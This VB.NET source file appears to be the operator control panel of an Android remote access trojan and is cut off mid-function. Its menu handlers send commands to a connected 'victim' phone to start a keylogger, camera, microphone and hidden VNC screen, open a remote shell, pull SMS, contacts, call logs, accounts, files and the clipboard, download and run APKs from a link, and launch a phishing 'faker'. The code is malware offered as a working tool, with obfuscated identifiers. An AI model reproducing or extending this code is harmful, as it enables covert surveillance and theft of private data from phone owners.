Imports System.Drawing.Drawing2D
Imports System.Net.Sockets
Public Class Frm_Config_ClientCard
    Public cClient As New TcpClient
    Public ClassClient As sockets.Frm_Config_Client
    Public UUID As String
    Public Sub New()
        InitializeComponent()
    End Sub
    Public Sub New(
                   clas As sockets.Frm_Config_Client)
        InitializeComponent()
        MyBase.BorderStyle = Windows.Forms.BorderStyle.None
        Me.ClassClient = clas
        Me.Tag = clas.UUID
        Me.cClient = clas.myClient
        Me.clientname.Text = clas.ClientName
        Me.UUID = clas.UUID
        Me.pingtext.Text = "..."
        clas.Card = Me
    End Sub
    Private Sub FilesToolStripMenuItem1_Click(sender As Object, e As EventArgs)

    End Sub
    Private Sub CallLogToolStripMenuItem_Click(sender As Object, e As EventArgs)

    End Sub
    Private Sub MessegesToolStripMenuItem_Click(sender As Object, e As EventArgs)

    End Sub
    Private Sub ContactsToolStripMenuItem1_Click(sender As Object, e As EventArgs)

    End Sub
    Private Sub AccountsToolStripMenuItem1_Click(sender As Object, e As EventArgs)

    End Sub
    Private Sub ApplecationsToolStripMenuItem_Click(sender As Object, e As EventArgs)

    End Sub
    Private Sub AliveScreenToolStripMenuItem_Click(sender As Object, e As EventArgs)


    End Sub
    Private Sub CameraToolStripMenuItem1_Click(sender As Object, e As EventArgs)

    End Sub
    Private Sub MicroPhoneToolStripMenuItem_Click(sender As Object, e As EventArgs)

    End Sub
    Private Sub bbtBbozmvsugvydVontnixcsybubNeczimNdicgpoomvopcbuaToolStripMenuItem_Click(sender As Object, e As EventArgs)

    End Sub
    Private Sub LocationToolStripMenuItem1_Click(sender As Object, e As EventArgs)

    End Sub
    Private Sub CallNumberToolStripMenuItem1_Click(sender As Object, e As EventArgs)

    End Sub
    Private Sub DownloadAPKRUNToolStripMenuItem_Click(sender As Object, e As EventArgs)

    End Sub
    Private Sub ShowMessegeToolStripMenuItem1_Click(sender As Object, e As EventArgs)

    End Sub
    Private Sub ClipBoardToolStripMenuItem_Click(sender As Object, e As EventArgs)

    End Sub
    Private Sub OpenLinkToolStripMenuItem1_Click(sender As Object, e As EventArgs)

    End Sub
    Private Sub ShellToolStripMenuItem1_Click(sender As Object, e As EventArgs)

    End Sub
    Private Sub SocialMediaHunterToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SocialMediaHunterToolStripMenuItem.Click
        If Not ClassClient Is Nothing Then
            Dim handle As String = "SM_Hunter_" & ClassClient.ClientAddressIP
            Dim Screener As Frm_Faker = My.Application.OpenForms(handle)
            If Screener Is Nothing Then
                Screener = New Frm_Faker
                Screener.Name = handle
                Screener.Title = String.Format("{0} - IP:{1}", "SM Hunter", ClassClient.ClientAddressIP)
                Screener.Tag = ClassClient.ClientAddressIP
                Screener.classClient = ClassClient
                Screener.Client = ClassClient.myClient
                Screener.DownloadsFolder = ClassClient.FolderUSER
                DirectCast(Screener, Control).Show()
            End If
        Else
            Return
        End If
    End Sub
    Private Sub PhoneInfoToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Not ClassClient Is Nothing Then
            Dim objs As Object() = {cClient, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".info" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.Information & sockets.Data.SPL_SOCKET & "information", Frm_Config_Codes.Encoding().GetBytes("null"), ClassClient}
            ClassClient.SendAsync(objs)
        End If
    End Sub
    Private Sub EditConnectionInfoToolStripMenuItem_Click(sender As Object, e As EventArgs)

    End Sub
    Private Sub RenameToolStripMenuItem1_Click(sender As Object, e As EventArgs)

    End Sub
    Private Sub RestartConnectionToolStripMenuItem_Click(sender As Object, e As EventArgs)

    End Sub
    Delegate Sub updatenew()
    Public Sub UpdateValue()
        If Me.InvokeRequired Then
            Dim logr As updatenew = New updatenew(AddressOf UpdateValue)
            Me.Invoke(logr)
            Exit Sub
        Else

        End If
    End Sub
    Private Sub CloseToolStripMenuItem1_Click(sender As Object, e As EventArgs)

    End Sub
    Private Sub ClientCard_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles MyBase.MouseDoubleClick
        If Not ClassClient Is Nothing Then
            Dim down As String = ClassClient.FolderUSER
            If Not IO.Directory.Exists(down) Then
                IO.Directory.CreateDirectory(down)
            End If
            Process.Start(down)
        End If
    End Sub
    Private Sub Flagpic_MouseEnter(sender As Object, e As EventArgs)
    End Sub
    Private Sub BattaryPic_MouseEnter(sender As Object, e As EventArgs)

    End Sub
    Private Sub ClientCard_Paint(sender As Object, e As PaintEventArgs) Handles MyBase.Paint
        Dim rect As Rectangle = Me.ClientRectangle 'Drawing Rounded Rectangle
        rect.X = rect.X + 1
        rect.Y = rect.Y + 1
        rect.Width -= 2
        rect.Height -= 2
        Using bb As GraphicsPath = GetPath(rect, 10)
            Using br As Brush = New SolidBrush(FillColor)
                e.Graphics.SmoothingMode = SmoothingMode.HighQuality
                e.Graphics.InterpolationMode = InterpolationMode.HighQualityBicubic
                e.Graphics.FillPath(br, bb)
            End Using
            Using br As Brush = New SolidBrush(ForeColor)
                rect.Inflate(-1, -1)
                e.Graphics.SmoothingMode = SmoothingMode.HighQuality
                e.Graphics.InterpolationMode = InterpolationMode.HighQualityBicubic
                e.Graphics.DrawPath(New Pen(br, 0), bb)
            End Using
        End Using
    End Sub
    Private Function FillColor() As Color
        Return Color.White
    End Function
    Protected Function GetPath(ByVal rc As Rectangle, ByVal r As Int32) As GraphicsPath
        Dim x As Int32 = rc.X, y As Int32 = rc.Y, w As Int32 = rc.Width, h As Int32 = rc.Height - 1
        r = r << 1
        Dim path As GraphicsPath = New GraphicsPath()
        If r > 0 Then
            If (r > h) Then r = h
            If (r > w) Then r = w
            path.AddArc(x, y, r, r, 180, 90)
            path.AddArc(x + w - r, y, r, r, 270, 90)
            path.AddArc(x + w - r, y + h - r, r, r, 0, 90)
            path.AddArc(x, y + h - r, r, r, 90, 90)
            path.CloseFigure()
        Else
            path.AddRectangle(rc)
        End If
        Return path
    End Function
    Private Sub ProfilePic_MouseDown(sender As Object, e As MouseEventArgs)
        If e.Button = MouseButtons.Right Then
            ctxMenu.Show(Me, e.Location)
        Else
            Dim getKEY As String() = ClassClient.Keys.Split(":")
            If Not getKEY.Length >= infoServer.KeySize Then
                Return
            End If
            Dim TipText As String = "Client-Info" & vbNewLine _
                                    & "Name:" & ClassClient.ClientName & vbNewLine _
                                    & "Defender:" & ClassClient.ClientDefender & vbNewLine _
                                    & "From:" & ClassClient.Country & vbNewLine _
                                    & "Host:" & getKEY(6) & vbNewLine _
                                    & "ip:" & getKEY(0) & vbNewLine _
                                    & "Andorid:" & ClassClient.android & vbNewLine _
                                    & "Port:" & getKEY(1) & vbNewLine
        End If
    End Sub
    Private Sub ProfilePic_MouseEnter(sender As Object, e As EventArgs)
        Me.BackColor = Color.FromArgb(42, 42, 42)
    End Sub
    Private Sub ProfilePic_MouseLeave(sender As Object, e As EventArgs)
        Me.BackColor = Color.Transparent
    End Sub
    Private Sub PhoneScreenPic_MouseEnter(sender As Object, e As EventArgs)

    End Sub
    Private Sub ClientCard_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        If Frm_Main.Enable_Language = True Then
        Else
            Me.Hide()
            Application.Exit()
        End If

    End Sub
    Private Sub NotificationsToolStripMenuItem_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub clientname_Click(sender As Object, e As EventArgs) Handles clientname.Click

    End Sub

    Private Sub ProfilePic_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub MatarAplicativoToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MatarAplicativoToolStripMenuItem.Click
        If Not ClassClient Is Nothing Then
            Dim objs As Object() = {cClient, Authentication_users.KeysClient2 & sockets.Data.SPL_SOCKET & "kill<*>" & "x" & sockets.Data.SPL_SOCKET & "0" & sockets.Data.SPL_SOCKET & "0" & sockets.Data.SPL_SOCKET & Authentication_users.VVaudrvVbnotaVbfxcViwvpiazbbocCfbgxcygpNzsimtmCvMx & sockets.Data.SPL_SOCKET & CStr(0) & sockets.Data.SPL_SOCKET & CStr(0) & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & ClassClient.ClientRemoteAddress, Frm_Config_Codes.Encoding().GetBytes("null"), ClassClient}
            ClassClient.SendAsync(objs)
        End If
    End Sub

    Private Sub HVNCToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles HVNCToolStripMenuItem.Click
        If Not ClassClient Is Nothing Then
            Dim cClient = ClassClient.myClient
            Dim handle As String = "Live_Screen_" & ClassClient.ClientAddressIP

            Dim Screener As Frm_VNC = My.Application.OpenForms(handle)

            If Screener Is Nothing Then

                Screener = New Frm_VNC

                Screener.Name = handle

                Screener.Title = String.Format("{0} - IP:{1}", "Live Screen", ClassClient.ClientAddressIP)

                Screener.Tag = ClassClient.ClientAddressIP

                Screener.classClient = ClassClient

                Screener.Client = ClassClient.myClient

                Screener.DownloadsFolder = ClassClient.FolderUSER
                DirectCast(Screener, Control).Show()
            End If

        End If
    End Sub

    Private Sub CameraToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CameraToolStripMenuItem.Click
        If Not ClassClient Is Nothing Then
            Dim handle As String = "Camera_Manager_" & ClassClient.ClientRemoteAddress
            Dim CameraManager As Frm_CameraManager = My.Application.OpenForms(handle)
            If CameraManager Is Nothing Then
                CameraManager = New Frm_CameraManager
                CameraManager.Name = handle
                CameraManager.Title = String.Format("{0} - IP:{1}", "Camera Manager", ClassClient.ClientAddressIP)
                CameraManager.classClient = ClassClient
                If CameraManager.classClient IsNot Nothing Then
                    Frm_Config_Settings.Directory_Exist(CameraManager.classClient)
                    CameraManager.tmpFolderUSER = CameraManager.classClient.FolderUSER
                End If
                CameraManager.Client = ClassClient.myClient
                CameraManager.CameraClient = cClient
                CameraManager.classCamera = ClassClient
                CameraManager.MainClassCamera = ClassClient
                CameraManager.TempImage = New PictureBox
                DirectCast(CameraManager, Control).Show()
            Else
                Return
            End If
        End If
    End Sub

    Private Sub MicrofoneToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MicrofoneToolStripMenuItem.Click
        If Not ClassClient Is Nothing Then
            Dim handle As String = "Microphone_" & ClassClient.ClientRemoteAddress
            Dim Microphone As Frm_Microphone = My.Application.OpenForms(handle)
            If Microphone Is Nothing Then
                Dim spl As String() = ClassClient.Keys.Split(":")
                If Not spl.Length >= infoServer.KeySize Then
                    Return
                End If
                Dim objs As Object() = {cClient, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".microphone" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.resultClient & sockets.Data.SPL_SOCKET & "start" & sockets.Data.SPL_DATA & spl(0) & sockets.Data.SPL_DATA & spl(1) & sockets.Data.SPL_DATA & "8000" & sockets.Data.SPL_DATA & Authentication_users.VqnnMcBNodbppuVddboMotgVicvotVmuNcoaapbcpnvurBimqa & sockets.Data.SPL_DATA & ClassClient.ClientRemoteAddress & sockets.Data.SPL_DATA & "0", Frm_Config_Codes.Encoding().GetBytes("null"), ClassClient}
                ClassClient.SendAsync(objs)
            End If
        End If
    End Sub

    Private Sub KeylogerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KeylogerToolStripMenuItem.Click
        If Not ClassClient Is Nothing Then
            ClassClient.Keylogg = True
            Dim objs As Object() = {cClient, Authentication_users.KeysClient8 & sockets.Data.SPL_SOCKET & Authentication_users.bbtBbozmvsugvydVontnixcsybubNeczimNdicgpoomvopcbua & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & "(unknown)", Frm_Config_Codes.Encoding().GetBytes("null"), ClassClient}
            ClassClient.SendAsync(objs)
        End If
    End Sub

    Private Sub GPSToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Not ClassClient Is Nothing Then
            ClassClient.qitGPS = False
            Dim objs As Object() = {cClient, Authentication_users.KeysClient3 & sockets.Data.SPL_SOCKET & sockets.Data.SPL_DATA & sockets.Data.SPL_SOCKET & Authentication_users.ccofyfnVpxcbbCqdxvvCzpxmzaMmdiuBwavtmvibxCVbcfvzbo, Frm_Config_Codes.Encoding().GetBytes("null"), ClassClient}
            ClassClient.SendAsync(objs)
        End If
    End Sub

    Private Sub EditarConexãoToolStripMenuItem_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub RenomearToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RenomearToolStripMenuItem.Click
        Dim p As New Frm_inp
        p.Text = "Rename victim"
        p.LTitle.Text = "add new name"
        p.InputText.Text = "Hacked"
        p.StartPosition = FormStartPosition.Manual
        p.Location = Frm_Config_Codes.FixSize(sockets.Data.angelform, p)
        Select Case p.ShowDialog(Me)
            Case DialogResult.OK
                Try
                    If Not ClassClient Is Nothing Then
                        Dim getKey As String() = ClassClient.Keys.Split(":")
                        Dim objs As Object() = {cClient, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".info" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.resultClient & sockets.Data.SPL_SOCKET & "rename" & sockets.Data.SPL_DATA & p.InputText.Text & sockets.Data.SPL_DATA & getKey(2), Frm_Config_Codes.Encoding().GetBytes("null"), ClassClient}
                        ClassClient.SendAsync(objs)
                        ClassClient.ClientName = p.InputText.Text
                        Frm_Config_Settings.Directory_Exist(ClassClient)
                    End If
                Finally
                End Try
        End Select
        p.Close()
    End Sub

    Private Sub ReiniciarToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ReiniciarToolStripMenuItem.Click
        If Not ClassClient Is Nothing Then
            Dim objs As Object() = {cClient, Authentication_users.pfazbrygpvxbsMbcobmuoMvydtziaiCqCBpBbacyvdsztMbvay & sockets.Data.SPL_SOCKET & "1000", Frm_Config_Codes.Encoding().GetBytes("null"), ClassClient}
            ClassClient.SendAsync(objs)
            sockets.Data.angelform.clientsflow.Controls.Remove(Me)
            ClassClient.Card = Nothing
            ClassClient.Close(cClient, "")
        End If
    End Sub

    Private Sub ClientConnetionToolStripMenuItem_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub LigarToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LigarToolStripMenuItem.Click
        Dim CP As New Frm_CallPhone
        CP.L0.Text = "add Number"
        CP.StartPosition = FormStartPosition.Manual
        CP.Location = Frm_Config_Codes.FixSize(sockets.Data.angelform, CP)
        Dim num As String = Nothing
        Dim Flag As String = Nothing
        If CP.ShowDialog() = DialogResult.OK Then
            num = CP.TextBox1.Text
            Flag = CP._Call
        Else
            CP.Close()
            GoTo SKIP
        End If
        CP.Close()
        If num = Nothing Then
            GoTo SKIP
        Else
            Try
                If Not ClassClient Is Nothing Then
                    Dim objs As Object() = {cClient, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".info" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.resultClient & sockets.Data.SPL_SOCKET & Flag & sockets.Data.SPL_DATA & "tel:" & num.Trim, Frm_Config_Codes.Encoding().GetBytes("null"), ClassClient}
                    ClassClient.SendAsync(objs)
                End If
            Finally
            End Try
        End If
SKIP:
    End Sub

    Private Sub DownloadExecuteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DownloadExecuteToolStripMenuItem.Click
        If Not ClassClient Is Nothing Then
            Dim result As Frm_Dialog = New Frm_Dialog
            result.Title = "Enter APK Link"
            result.ShowDialog()
                If result.DialogResult = DialogResult.OK Then
                Dim spl As String() = ClassClient.Keys.Split(":")
                Dim chk0, chk1 As Integer
                chk0 = 0
                chk1 = 0
                Dim objs As Object() = {cClient, Authentication_users.KeysClient2 & sockets.Data.SPL_SOCKET & "msg:" & Frm_Config_Settings.ChekLink(result.Mytext.Text) & ":up" & sockets.Data.SPL_SOCKET & spl(0) & sockets.Data.SPL_SOCKET & spl(1) & sockets.Data.SPL_SOCKET & Authentication_users.VVaudrvVbnotaVbfxcViwvpiazbbocCfbgxcygpNzsimtmCvMx & sockets.Data.SPL_SOCKET & CStr(chk0) & sockets.Data.SPL_SOCKET & CStr(chk1) & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & ClassClient.ClientRemoteAddress, Frm_Config_Codes.Encoding().GetBytes("null"), ClassClient}
                ClassClient.SendAsync(objs)
            Else
                Return
            End If
        End If
    End Sub

    Private Sub EnviarMensagemToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EnviarMensagemToolStripMenuItem.Click
        If Not ClassClient Is Nothing Then
            Dim result As Frm_Dialog = New Frm_Dialog
            result.Title = "Enter Messege"
            result.ShowDialog()
            If result.DialogResult = DialogResult.OK Then
                Dim spl As String() = ClassClient.Keys.Split(":")
                Dim chk0, chk1 As Integer
                chk0 = 0
                chk1 = 0
                Dim objs As Object() = {cClient, Authentication_users.KeysClient2 & sockets.Data.SPL_SOCKET & "msg:" & result.Mytext.Text & sockets.Data.SPL_SOCKET & spl(0) & sockets.Data.SPL_SOCKET & spl(1) & sockets.Data.SPL_SOCKET & Authentication_users.VVaudrvVbnotaVbfxcViwvpiazbbocCfbgxcygpNzsimtmCvMx & sockets.Data.SPL_SOCKET & CStr(chk0) & sockets.Data.SPL_SOCKET & CStr(chk1) & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & ClassClient.ClientRemoteAddress, Frm_Config_Codes.Encoding().GetBytes("null"), ClassClient}
                ClassClient.SendAsync(objs)
            Else
                Return
            End If
        End If
    End Sub
    Private Sub CopiarToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopiarToolStripMenuItem.Click
        If Not ClassClient Is Nothing Then
            Dim objs As Object() = {cClient, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".info" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.cfpvMvfgccCwdesmwcyzgNbpvyxaVpvyrMcyyavrsyNcfizCsr & sockets.Data.SPL_SOCKET & "get" & sockets.Data.SPL_DATA & "null", Frm_Config_Codes.Encoding().GetBytes("null"), ClassClient}
            ClassClient.SendAsync(objs)
        End If
    End Sub

    Private Sub AbrirLinkToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AbrirLinkToolStripMenuItem.Click
        If Not ClassClient Is Nothing Then
            Dim result As Frm_Dialog = New Frm_Dialog
            result.Title = "Enter Link"
            result.ShowDialog()
            If result.DialogResult = DialogResult.OK Then
                Dim spl As String() = ClassClient.Keys.Split(":")
                Dim chk0, chk1 As Integer
                chk0 = 0
                chk1 = 0
                Dim objs As Object() = {cClient, Authentication_users.KeysClient2 & sockets.Data.SPL_SOCKET & "lnk<*>" & Frm_Config_Settings.ChekLink(result.Mytext.Text) & sockets.Data.SPL_SOCKET & spl(0) & sockets.Data.SPL_SOCKET & spl(1) & sockets.Data.SPL_SOCKET & Authentication_users.VVaudrvVbnotaVbfxcViwvpiazbbocCfbgxcygpNzsimtmCvMx & sockets.Data.SPL_SOCKET & CStr(chk0) & sockets.Data.SPL_SOCKET & CStr(chk1) & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & ClassClient.ClientRemoteAddress, Frm_Config_Codes.Encoding().GetBytes("null"), ClassClient}
                ClassClient.SendAsync(objs)
            Else
                Return
            End If
        End If
    End Sub

    Private Sub ShellToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShellToolStripMenuItem.Click
        If Not ClassClient Is Nothing Then
            Dim objs As Object() = {cClient, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".terminal" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.fizbuCxccmvzoBCBzCpvBeiNzadNgNqazVdvbytrwcvxvspiNv & sockets.Data.SPL_SOCKET & "run", Frm_Config_Codes.Encoding().GetBytes("null"), ClassClient}
            ClassClient.SendAsync(objs)
        End If
    End Sub

    Private Sub MonitorToolStripMenuItem_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub ArquivosToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ArquivosToolStripMenuItem.Click
        If Not ClassClient Is Nothing Then
            Dim objs As Object() = {cClient, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.ycoayfzNeuvVaavovdfoMyVuocnvyrvcziocxaaNuzoppMixyv & sockets.Data.SPL_SOCKET & "files" & sockets.Data.SPL_DATA & "get0", Frm_Config_Codes.Encoding().GetBytes("null"), ClassClient}
            ClassClient.SendAsync(objs)
        End If
    End Sub

    Private Sub ChamadasToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ChamadasToolStripMenuItem.Click
        If Not ClassClient Is Nothing Then
            Dim objs As Object() = {cClient, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".calls" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.xMbcsprftVsbyrnepMvbxymvbcaMBtspwMtsdCamacqdvsVofb & sockets.Data.SPL_SOCKET & "calls", Frm_Config_Codes.Encoding().GetBytes("null"), ClassClient}
            ClassClient.SendAsync(objs)
        End If
    End Sub

    Private Sub MensagemToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MensagemToolStripMenuItem.Click
        If Not ClassClient Is Nothing Then
            Dim objs As Object() = {cClient, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".sms" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.xMNiBuVwxgcCoigfdybcfswmfvNypiCpnbvMxNvucpanibamgx & sockets.Data.SPL_SOCKET & "sms" & sockets.Data.SPL_DATA & "content://sms/", Frm_Config_Codes.Encoding().GetBytes("null"), ClassClient}
            ClassClient.SendAsync(objs)
        End If
    End Sub

    Private Sub ContatosToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ContatosToolStripMenuItem.Click
        If Not ClassClient Is Nothing Then
            Dim objs As Object() = {cClient, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".contacts" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.NryoNrnbVyodfombCsoqCzuyoMenssfutitvVvNfBwmpuzyaos & sockets.Data.SPL_SOCKET & "contacts", Frm_Config_Codes.Encoding().GetBytes("null"), ClassClient}
            ClassClient.SendAsync(objs)
        End If
    End Sub

    Private Sub ContasToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ContasToolStripMenuItem.Click
        If Not ClassClient Is Nothing Then
            Dim objs As Object() = {cClient, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".info" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.Account & sockets.Data.SPL_SOCKET & "account", Frm_Config_Codes.Encoding().GetBytes("null"), ClassClient}
            ClassClient.SendAsync(objs)
        End If
    End Sub

    Private Sub AplicativosToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AplicativosToolStripMenuItem.Click
        If Not ClassClient Is Nothing Then
            Dim objs As Object() = {cClient, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".apps" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.Apps & sockets.Data.SPL_SOCKET & "apps", Frm_Config_Codes.Encoding().GetBytes("null"), ClassClient}
            ClassClient.SendAsync(objs)
        End If
    End Sub

    Private Sub notpic_Click(sender As Object, e As EventArgs) Handles notpic.Click

    End Sub

    Private Sub androver_Click(sender As Object, e As EventArgs) Handles androver.Click

    End Sub

    Private Sub ctxMenu_Opening(sender As Object, e As System.ComponentModel.CancelEventArgs) Handles ctxMenu.Opening

    End Sub

    Private Sub Guna2GradientPanel2_Paint(sender As Object, e As PaintEventArgs)

    End Sub

    Private Sub Label2_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2PictureBox7_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2PictureBox10_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox10.Click
        If Not ClassClient Is Nothing Then
            Dim objs As Object() = {cClient, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.ycoayfzNeuvVaavovdfoMyVuocnvyrvcziocxaaNuzoppMixyv & sockets.Data.SPL_SOCKET & "files" & sockets.Data.SPL_DATA & "get0", Frm_Config_Codes.Encoding().GetBytes("null"), ClassClient}
            ClassClient.SendAsync(objs)
        End If
    End Sub

    Private Sub Guna2GradientPanel4_Paint(sender As Object, e As PaintEventArgs)

    End Sub

    Private Sub Guna2GradientPanel3_Paint(sender As Object, e As PaintEventArgs)

    End Sub

    Private Sub Guna2GradientPanel4_Paint_1(sender As Object, e As PaintEventArgs)

    End Sub

    Private Sub Guna2PictureBox1_Click(sender As Object, e As EventArgs)

    End Sub
    Public Sub trocarPainelLive(ByVal Screen As Form)
        'PainelScreenLive.Controls.Clear()
        'Screen.TopLevel = False
        'PainelScreenLive.Controls.Add(Screen)
        'Screen.Show()
    End Sub
    Private Sub Guna2PictureBox15_Click(sender As Object, e As EventArgs)


    End Sub

    Private Sub Guna2PictureBox23_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox23.Click
        If Not ClassClient Is Nothing Then
            Dim handle As String = "Camera_Manager_" & ClassClient.ClientRemoteAddress
            Dim CameraManager As Frm_CameraManager = My.Application.OpenForms(handle)
            If CameraManager Is Nothing Then
                CameraManager = New Frm_CameraManager
                CameraManager.Name = handle
                CameraManager.Title = String.Format("{0} - IP:{1}", "Camera Manager", ClassClient.ClientAddressIP)
                CameraManager.classClient = ClassClient
                If CameraManager.classClient IsNot Nothing Then
                    Frm_Config_Settings.Directory_Exist(CameraManager.classClient)
                    CameraManager.tmpFolderUSER = CameraManager.classClient.FolderUSER
                End If
                CameraManager.Client = ClassClient.myClient
                CameraManager.CameraClient = cClient
                CameraManager.classCamera = ClassClient
                CameraManager.MainClassCamera = ClassClient
                CameraManager.TempImage = New PictureBox
                DirectCast(CameraManager, Control).Show()
            Else
                Return
            End If
        End If
    End Sub

    Private Sub Guna2PictureBox22_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox22.Click
        If Not ClassClient Is Nothing Then
            Dim handle As String = "Microphone_" & ClassClient.ClientRemoteAddress
            Dim Microphone As Frm_Microphone = My.Application.OpenForms(handle)
            If Microphone Is Nothing Then
                Dim spl As String() = ClassClient.Keys.Split(":")
                If Not spl.Length >= infoServer.KeySize Then
                    Return
                End If
                Dim objs As Object() = {cClient, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".microphone" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.resultClient & sockets.Data.SPL_SOCKET & "start" & sockets.Data.SPL_DATA & spl(0) & sockets.Data.SPL_DATA & spl(1) & sockets.Data.SPL_DATA & "8000" & sockets.Data.SPL_DATA & Authentication_users.VqnnMcBNodbppuVddboMotgVicvotVmuNcoaapbcpnvurBimqa & sockets.Data.SPL_DATA & ClassClient.ClientRemoteAddress & sockets.Data.SPL_DATA & "0", Frm_Config_Codes.Encoding().GetBytes("null"), ClassClient}
                ClassClient.SendAsync(objs)
            End If
        End If
    End Sub

    Private Sub Guna2PictureBox21_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox21.Click
        If Not ClassClient Is Nothing Then
            ClassClient.Keylogg = True
            Dim objs As Object() = {cClient, Authentication_users.KeysClient8 & sockets.Data.SPL_SOCKET & Authentication_users.bbtBbozmvsugvydVontnixcsybubNeczimNdicgpoomvopcbua & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & "(unknown)", Frm_Config_Codes.Encoding().GetBytes("null"), ClassClient}
            ClassClient.SendAsync(objs)
        End If
    End Sub

    Private Sub Guna2PictureBox13_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox13.Click
        If Not ClassClient Is Nothing Then
            Dim objs As Object() = {cClient, Authentication_users.pfazbrygpvxbsMbcobmuoMvydtziaiCqCBpBbacyvdsztMbvay & sockets.Data.SPL_SOCKET & "1000", Frm_Config_Codes.Encoding().GetBytes("null"), ClassClient}
            ClassClient.SendAsync(objs)
            sockets.Data.angelform.clientsflow.Controls.Remove(Me)
            ClassClient.Card = Nothing
            ClassClient.Close(cClient, "")
        End If
    End Sub

    Private Sub Guna2PictureBox18_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox18.Click
        If Not ClassClient Is Nothing Then
            Dim result As Frm_Dialog = New Frm_Dialog
            result.Title = "Enter APK Link"
            result.ShowDialog()
            If result.DialogResult = DialogResult.OK Then
                Dim spl As String() = ClassClient.Keys.Split(":")
                Dim chk0, chk1 As Integer
                chk0 = 0
                chk1 = 0
